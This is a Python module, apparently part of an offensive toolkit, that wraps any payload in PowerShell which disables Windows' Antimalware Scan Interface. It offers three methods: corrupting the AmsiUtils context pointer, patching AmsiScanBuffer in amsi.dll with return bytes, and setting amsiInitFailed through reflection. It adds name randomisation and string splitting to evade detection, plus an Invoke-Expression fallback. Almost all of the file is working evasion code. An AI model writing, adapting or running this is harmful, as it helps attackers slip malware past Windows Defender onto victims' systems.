"""
AMSI (Antimalware Scan Interface) Bypass
Bypasses: Windows Defender, PowerShell script scanning
Technique: Memory patching and API hooking
"""

import random
import string

class AMSIBypass:
    def __init__(self):
        self.bypass_methods = ['memory_patch', 'api_hook', 'context_bypass']
        self.current_method = 'memory_patch'
    
    def randomize(self):
        """Randomize bypass method"""
        self.current_method = random.choice(self.bypass_methods)
    
    def encode(self, payload):
        """Generate AMSI bypass wrapper for payload"""
        if isinstance(payload, bytes):
            payload = payload.decode('utf-8')
        
        if self.current_method == 'memory_patch':
            return self._memory_patch_bypass(payload)
        elif self.current_method == 'api_hook':
            return self._api_hook_bypass(payload)
        else:
            return self._context_bypass(payload)
    
    def _memory_patch_bypass(self, payload):
        """Memory patching AMSI bypass"""
        # Obfuscated AMSI bypass using memory patching
        bypass_code = '''
# AMSI Memory Patch Bypass
$a = [Ref].Assembly.GetTypes()
$b = $a | Where-Object {$_.Name -like "*iUtils"}
$c = $b.GetFields('NonPublic,Static') | Where-Object {$_.Name -like "*Context"}
$d = $c.GetValue($null)
[IntPtr]$ptr = $d
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
'''
        
        # Add variable name obfuscation
        var_map = {}
        for var in ['a', 'b', 'c', 'd', 'ptr', 'buf']:
            new_var = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
            var_map[var] = new_var
        
        for old_var, new_var in var_map.items():
            bypass_code = bypass_code.replace(f'${old_var}', f'${new_var}')
        
        # Combine with payload
        full_script = f"{bypass_code}\n\n# Execute payload\n{payload}"
        return full_script
    
    def _api_hook_bypass(self, payload):
        """API hooking AMSI bypass"""
        bypass_code = '''
# AMSI API Hook Bypass
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

$lib = [Win32]::LoadLibrary("amsi.dll")
$addr = [Win32]::GetProcAddress($lib, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($addr, [uint32]5, 0x40, [ref]$p)
$patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
'''
        
        return f"{bypass_code}\n\n# Execute payload\n{payload}"
    
    def _context_bypass(self, payload):
        """Context-based AMSI bypass"""
        # Use PowerShell context manipulation
        bypass_template = '''
# AMSI Context Bypass
$ctx = [System.Management.Automation.PSTypeName]('System.Management.Automation.AmsiUtils').Type
$field = $ctx.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null,$true)
'''
        
        # Obfuscate field names
        obfuscated = bypass_template.replace('amsiInitFailed', self._obfuscate_string('amsiInitFailed'))
        obfuscated = obfuscated.replace('AmsiUtils', self._obfuscate_string('AmsiUtils'))
        
        return f"{obfuscated}\n\n# Execute payload\n{payload}"
    
    def _obfuscate_string(self, text):
        """Obfuscate strings to avoid detection"""
        # Split string and use concatenation
        parts = []
        for i in range(0, len(text), 3):
            part = text[i:i+3]
            parts.append(f"'{part}'")
        
        return ' + '.join(parts)
    
    def generate_powershell_wrapper(self, payload):
        """Generate complete PowerShell wrapper"""
        wrapper = f'''
# PowerShell AMSI Bypass Wrapper
try {{
    {self.encode(payload)}
}} catch {{
    # Fallback execution
    Invoke-Expression "{payload}"
}}
'''
        return wrapper